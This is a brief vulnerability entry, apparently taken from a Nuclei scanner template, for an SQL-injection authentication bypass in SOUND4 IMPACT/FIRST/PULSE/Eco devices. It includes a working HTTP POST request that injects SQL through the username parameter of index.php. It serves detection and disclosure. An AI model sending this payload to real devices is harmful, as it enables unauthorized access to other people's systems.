# Vulnerability: SOUND4 IMPACT/FIRST/PULSE/Eco <= 2.x - Authentication Bypass
**Classification:** CWE-89
**Source:** Nuclei Template (`sound4-impact-auth-bypass.yaml`)

## Description
The application suffers from an SQL Injection vulnerability. Input passed through the 'username' POST parameter in 'index.php' is not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code and bypass the authentication mechanism.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=%27%2Bjoxvy--%2Bz&password=ffesdf
```

